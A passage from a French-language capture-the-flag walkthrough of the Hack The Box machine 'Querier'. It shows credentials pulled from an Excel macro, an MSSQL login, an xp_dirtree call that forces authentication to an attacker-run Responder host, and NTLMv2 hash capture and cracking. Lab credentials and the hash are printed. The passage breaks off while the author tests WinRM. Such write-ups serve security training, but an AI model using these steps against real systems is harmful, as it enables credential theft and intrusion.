+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Tue Jan <span class="m">29</span> 00:23:48 <span class="m">2019</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Tue Jan <span class="m">29</span> 00:23:48 <span class="m">2019</span>
+</span></span><span class="line"><span class="cl">  Currency Volume Report.xlsm         A    <span class="m">12229</span>  Sun Jan <span class="m">27</span> 23:21:34 <span class="m">2019</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="m">5158399</span> blocks of size 4096. <span class="m">850009</span> blocks available
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get <span class="s2">&#34;Currency Volume Report.xlsm&#34;</span>
+</span></span><span class="line"><span class="cl">getting file <span class="se">\C</span>urrency Volume Report.xlsm of size <span class="m">12229</span> as Currency Volume Report.xlsm <span class="o">(</span>20.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 20.4 KiloBytes/sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  file Currency<span class="se">\ </span>Volume<span class="se">\ </span>Report.xlsm
+</span></span><span class="line"><span class="cl">Currency Volume Report.xlsm: Microsoft Excel 2007+</span></span></code></pre></div></div>
+<h3 id="analyse-du-fichier-excel">Analyse du fichier EXCEL</h3>
+<p>J&rsquo;ai ouvert le fichier et je vois qu&rsquo;il est vide.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Querier/Querier-1.png"
+        data-srcset="/images/Querier/Querier-1.png, /images/Querier/Querier-1.png 1.5x, /images/Querier/Querier-1.png 2x"
+        data-sizes="auto"
+        alt="/images/Querier/Querier-1.png"
+        title="/images/Querier/Querier-1.png" width="925" height="435" /></p>
+<p>Je décide alors de regarder un peu plus en profondeur le fichier avec la commande <code>strings</code>. Je remarque alors qu&rsquo;il s&rsquo;agit en fait d&rsquo;une archive contenant plusieurs fichiers XML.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  strings Currency<span class="se">\ </span>Volume<span class="se">\ </span>Report.xlsm
+</span></span><span class="line"><span class="cl"><span class="o">[</span>&lt;snip&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Content_Types<span class="o">]</span>.xmlPK
+</span></span><span class="line"><span class="cl">_rels/.relsPK
+</span></span><span class="line"><span class="cl"><span class="p">;</span>O6-
+</span></span><span class="line"><span class="cl">xl/workbook.xmlPK
+</span></span><span class="line"><span class="cl">xl/_rels/workbook.xml.relsPK
+</span></span><span class="line"><span class="cl">xl/worksheets/sheet1.xmlPK
+</span></span><span class="line"><span class="cl">xl/theme/theme1.xmlPK
+</span></span><span class="line"><span class="cl">xl/styles.xmlPK
+</span></span><span class="line"><span class="cl">xl/vbaProject.binPK
+</span></span><span class="line"><span class="cl">docProps/core.xmlPK
+</span></span><span class="line"><span class="cl">docProps/app.xmlPK</span></span></code></pre></div></div>
+<p>Je dézippe alors le fichier avec <code>7z</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  7z x /Currency<span class="se">\ </span>Volume<span class="se">\ </span>Report.xlsm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span class="line"><span class="cl">p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_US.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,16 CPUs AMD Ryzen <span class="m">7</span> 5825U with Radeon Graphics          <span class="o">(</span>A50F00<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Scanning the drive <span class="k">for</span> archives:
+</span></span><span class="line"><span class="cl"><span class="m">1</span> file, <span class="m">12229</span> bytes <span class="o">(</span><span class="m">12</span> KiB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extracting archive: ../Currency Volume Report.xlsm
+</span></span><span class="line"><span class="cl">--
+</span></span><span class="line"><span class="cl"><span class="nv">Path</span> <span class="o">=</span> ../Currency Volume Report.xlsm
+</span></span><span class="line"><span class="cl"><span class="nv">Type</span> <span class="o">=</span> zip
+</span></span><span class="line"><span class="cl">Physical <span class="nv">Size</span> <span class="o">=</span> <span class="m">12229</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Everything is Ok
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Files: <span class="m">10</span>
+</span></span><span class="line"><span class="cl">Size:       <span class="m">26828</span>
+</span></span><span class="line"><span class="cl">Compressed: <span class="m">12229</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  tree
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── <span class="o">[</span>Content_Types<span class="o">]</span>.xml
+</span></span><span class="line"><span class="cl">├── docProps
+</span></span><span class="line"><span class="cl">│   ├── app.xml
+</span></span><span class="line"><span class="cl">│   └── core.xml
+</span></span><span class="line"><span class="cl">├── _rels
+</span></span><span class="line"><span class="cl">└── xl
+</span></span><span class="line"><span class="cl">    ├── _rels
+</span></span><span class="line"><span class="cl">    │   └── workbook.xml.rels
+</span></span><span class="line"><span class="cl">    ├── styles.xml
+</span></span><span class="line"><span class="cl">    ├── theme
+</span></span><span class="line"><span class="cl">    │   └── theme1.xml
+</span></span><span class="line"><span class="cl">    ├── vbaProject.bin
+</span></span><span class="line"><span class="cl">    ├── workbook.xml
+</span></span><span class="line"><span class="cl">    └── worksheets
+</span></span><span class="line"><span class="cl">        └── sheet1.xml</span></span></code></pre></div></div>
+<p>Dans le fichier <code>xl/workbook.xml</code>, je trouve un potentiel utilisateur valide <code>Luis</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  strings xl/workbook.xml
+</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">&#34;yes&#34;</span>?&gt;
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl"><span class="nv">Requires</span><span class="o">=</span><span class="s2">&#34;x15&#34;</span>&gt;&lt;x15ac:absPath <span class="nv">url</span><span class="o">=</span><span class="s2">&#34;C:\Users\Luis\Desktop\&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;snip&gt;</span></span></span></code></pre></div></div>
+<p>Puis dans le fichier <code>xl/vabProject.bin</code>, je trouve ce qui semble être les identifiants de la base de données <code>reporting:PcwTWTHRwryjc$c6</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  strings xl/vbaProject.bin
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">Set <span class="nv">rs</span> <span class="o">=</span> conn.Execute<span class="o">(</span><span class="s2">&#34;SELECT * @@version;&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Driver</span><span class="o">={</span>SQL Server<span class="o">}</span><span class="p">;</span><span class="nv">Server</span><span class="o">=</span>QUERIER<span class="p">;</span><span class="nv">Trusted_Connection</span><span class="o">=</span>no<span class="p">;</span><span class="nv">Database</span><span class="o">=</span>volume<span class="p">;</span><span class="nv">Uid</span><span class="o">=</span>reporting<span class="p">;</span><span class="nv">Pwd</span><span class="o">=</span>PcwTWTHRwryjc<span class="nv">$c6</span>
+</span></span><span class="line"><span class="cl">&lt;snip&gt;</span></span></code></pre></div></div>
+<p>Je vérifie la validité des identifiant avec <code>netxec</code> mais cela ne semble pas être la bonne combinaison. Je teste alors le mot de passe avec <code>luis</code> et <code>sa</code> (utilisateur par défaut de MSSQL), mais il semble qu&rsquo;aucun d&rsquo;entre eux ne soit le propriétaire de ce mot de passe.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  nxc mssql querier.htb.local -u <span class="s1">&#39;reporting&#39;</span> -p <span class="s1">&#39;PcwTWTHRwryjc$c6&#39;</span> --local-auth
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>-<span class="o">]</span> QUERIER<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span> <span class="o">(</span>Login failed <span class="k">for</span> user <span class="s1">&#39;reporting&#39;</span>. Please try again with or without <span class="s1">&#39;--local-auth&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb querier.htb.local -u <span class="s1">&#39;luis&#39;</span> -p <span class="s1">&#39;PcwTWTHRwryjc$c6&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.181.104  <span class="m">445</span>    QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.181.104  <span class="m">445</span>    QUERIER          <span class="o">[</span>-<span class="o">]</span> HTB.LOCAL<span class="se">\l</span>uis:PcwTWTHRwryjc<span class="nv">$c6</span> STATUS_NO_LOGON_SERVERS
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  nxc mssql querier.htb.local -u <span class="s1">&#39;luis&#39;</span> -p <span class="s1">&#39;PcwTWTHRwryjc$c6&#39;</span>
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>-<span class="o">]</span> HTB.LOCAL<span class="se">\l</span>uis:PcwTWTHRwryjc<span class="nv">$c6</span> <span class="o">(</span>Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without <span class="s1">&#39;--local-auth&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  nxc mssql querier.htb.local -u <span class="s1">&#39;luis&#39;</span> -p <span class="s1">&#39;PcwTWTHRwryjc$c6&#39;</span> --local-auth
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>-<span class="o">]</span> QUERIER<span class="se">\l</span>uis:PcwTWTHRwryjc<span class="nv">$c6</span> <span class="o">(</span>Login failed <span class="k">for</span> user <span class="s1">&#39;luis&#39;</span>. Please try again with or without <span class="s1">&#39;--local-auth&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  nxc mssql querier.htb.local -u <span class="s1">&#39;sa&#39;</span> -p <span class="s1">&#39;PcwTWTHRwryjc$c6&#39;</span> --local-auth
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MSSQL       10.129.181.104  <span class="m">1433</span>   QUERIER          <span class="o">[</span>-<span class="o">]</span> QUERIER<span class="se">\s</span>a:PcwTWTHRwryjc<span class="nv">$c6</span> <span class="o">(</span>Login failed <span class="k">for</span> user <span class="s1">&#39;sa&#39;</span>. Please try again with or without <span class="s1">&#39;--local-auth&#39;</span><span class="o">)</span></span></span></code></pre></div></div>
+<h3 id="enumération-de-mssql1433">Enumération de MSSQL(1433)</h3>
+<p>Je décide alors de tester les identifiants directement avec <code>mssqlclient</code>. Cela fonctionne, j&rsquo;arrive à me connecter avec les identifiants trouvees dans le fichier <code>xl/vabProject.bin</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  mssqlclient.py <span class="s1">&#39;reporting&#39;</span>:<span class="s1">&#39;PcwTWTHRwryjc$c6&#39;</span>@<span class="s1">&#39;querier.htb.local&#39;</span> -windows-auth                                                      <span class="m">130</span> ↵
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;volume&#39;</span>.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">140</span> 3232<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)</span>&gt; <span class="nb">help</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    lcd <span class="o">{</span>path<span class="o">}</span>                 - changes the current <span class="nb">local</span> directory to <span class="o">{</span>path<span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span>                       - terminates the server process <span class="o">(</span>and this session<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    enable_xp_cmdshell         - you know what it means
+</span></span><span class="line"><span class="cl">    disable_xp_cmdshell        - you know what it means
+</span></span><span class="line"><span class="cl">    enum_db                    - enum databases
+</span></span><span class="line"><span class="cl">    enum_links                 - enum linked servers
+</span></span><span class="line"><span class="cl">    enum_impersonate           - check logins that can be impersonated
+</span></span><span class="line"><span class="cl">    enum_logins                - enum login users
+</span></span><span class="line"><span class="cl">    enum_users                 - enum current db users
+</span></span><span class="line"><span class="cl">    enum_owner                 - enum db owner
+</span></span><span class="line"><span class="cl">    exec_as_user <span class="o">{</span>user<span class="o">}</span>        - impersonate with execute as user
+</span></span><span class="line"><span class="cl">    exec_as_login <span class="o">{</span>login<span class="o">}</span>      - impersonate with execute as login
+</span></span><span class="line"><span class="cl">    xp_cmdshell <span class="o">{</span>cmd<span class="o">}</span>          - executes cmd using xp_cmdshell
+</span></span><span class="line"><span class="cl">    xp_dirtree <span class="o">{</span>path<span class="o">}</span>          - executes xp_dirtree on the path
+</span></span><span class="line"><span class="cl">    sp_start_job <span class="o">{</span>cmd<span class="o">}</span>         - executes cmd using the sql server agent <span class="o">(</span>blind<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    use_link <span class="o">{</span>link<span class="o">}</span>            - linked server to use <span class="o">(</span><span class="nb">set</span> use_link localhost to go back to <span class="nb">local</span> or use_link .. to get back one step<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    ! <span class="o">{</span>cmd<span class="o">}</span>                    - executes a <span class="nb">local</span> shell cmd
+</span></span><span class="line"><span class="cl">    upload <span class="o">{</span>from<span class="o">}</span> <span class="o">{</span>to<span class="o">}</span>         - uploads file <span class="o">{</span>from<span class="o">}</span> to the SQLServer host <span class="o">{</span>to<span class="o">}</span>
+</span></span><span class="line"><span class="cl">    show_query                 - show query
+</span></span><span class="line"><span class="cl">    mask_query                 - mask query
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)</span>&gt;</span></span></code></pre></div></div>
+<p>Franchement je ne sais pas ce qu&rsquo;il se passait avec <code>netexec</code> pendant que j&rsquo;attaquait cette machine.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Querier/Querier-2.png"
+        data-srcset="/images/Querier/Querier-2.png, /images/Querier/Querier-2.png 1.5x, /images/Querier/Querier-2.png 2x"
+        data-sizes="auto"
+        alt="/images/Querier/Querier-2.png"
+        title="/images/Querier/Querier-2.png" width="320" height="169" /></p>
+<p>Je n&rsquo;ai pas les droits pour activer l&rsquo;exécution de commande à distance. Mais je vois que je peux utiliser <code>xp_dirtree</code>. Donc je lance <code>responder</code> et avec <code>xp_dirtree</code> j&rsquo;essais d&rsquo;énumérer les fichiers d&rsquo;un partage fictif cree par <code>responder</code> sur ma machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)</span>&gt; enable_xp_cmdshell<span class="p">;</span>
+</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 105: User does not have permission to perform this action.
+</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do</span> not have permission to run the RECONFIGURE statement.
+</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 62: The configuration option <span class="s1">&#39;xp_cmdshell&#39;</span> does not exist, or it may be an advanced option.
+</span></span><span class="line"><span class="cl">ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do</span> not have permission to run the RECONFIGURE statement.
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)</span>&gt; xp_dirtree //10.10.14.89/fakeshare
+</span></span><span class="line"><span class="cl">subdirectory   depth   file
+</span></span><span class="line"><span class="cl">------------   -----   ----
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)</span>&gt;</span></span></code></pre></div></div>
+<p>Je récupère alors le hash NTLM de l&rsquo;utilisateur <code>mssql-svc</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier/smb
+</span></span><span class="line"><span class="cl">╰─➤  responder -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.129.181.104
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : QUERIER<span class="se">\m</span>ssql-svc
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : mssql-svc::QUERIER:1122334455667788:EB2657DD2F736F0C9A49BA77A475B9DA:010100000000000080A71E50D8F9DB01CE17D781461E4DDB0000000002000800570035004D005A0001001E00570049004E002D004A004E004E005000450031004100420037004500390004003400570049004E002D004A004E004E00500045003100410042003700450039002E00570035004D005A002E004C004F00430041004C0003001400570035004D005A002E004C004F00430041004C0005001400570035004D005A002E004C004F00430041004C000700080080A71E50D8F9DB0106000400020000000800300030000000000000000000000000300000684142AB12D3574039A7D64286DFF0AADB9974DF8DF5B9E27BE8AF601A0533DA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0038003900000000000000000000000000</span></span></code></pre></div></div>
+<p>Je crack alors le hash avec <code>john</code> et je trouve le mot de passe <code>corporate568</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyout.txt mssql-svc.hash
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">16</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, <span class="s1">&#39;h&#39;</span> <span class="k">for</span> help, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">corporate568     <span class="o">(</span>mssql-svc<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:01 DONE <span class="o">(</span>2025-07-21 00:52<span class="o">)</span> 0.6289g/s 5636Kp/s 5636Kc/s 5636KC/s cosmicman5..coreyny
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.</span></span></code></pre></div></div>
+<p>La je vois que je ne pas avoir de shell avec <code>mssql-svc</code>. A ce stade je ne sais pas si c&rsquo;est <code>netexec</code> qui me joue des tours, mais bon, j&rsquo;avance. J&rsquo;ai d&rsquo;autres possibilités d&rsquo;avoir un shell.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/Querier
+</span></span><span class="line"><span class="cl">╰─➤  nxc winrm querier.htb.local -u <span class="s1">&#39;mssql-svc&#39;</span> -p <span class="s1">&#39;corporate568&#39;</span>
+</span></span><span class="line"><span class="cl">WINRM       10.129.181.104  <span class="m">5985</span>   QUERIER          <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span>
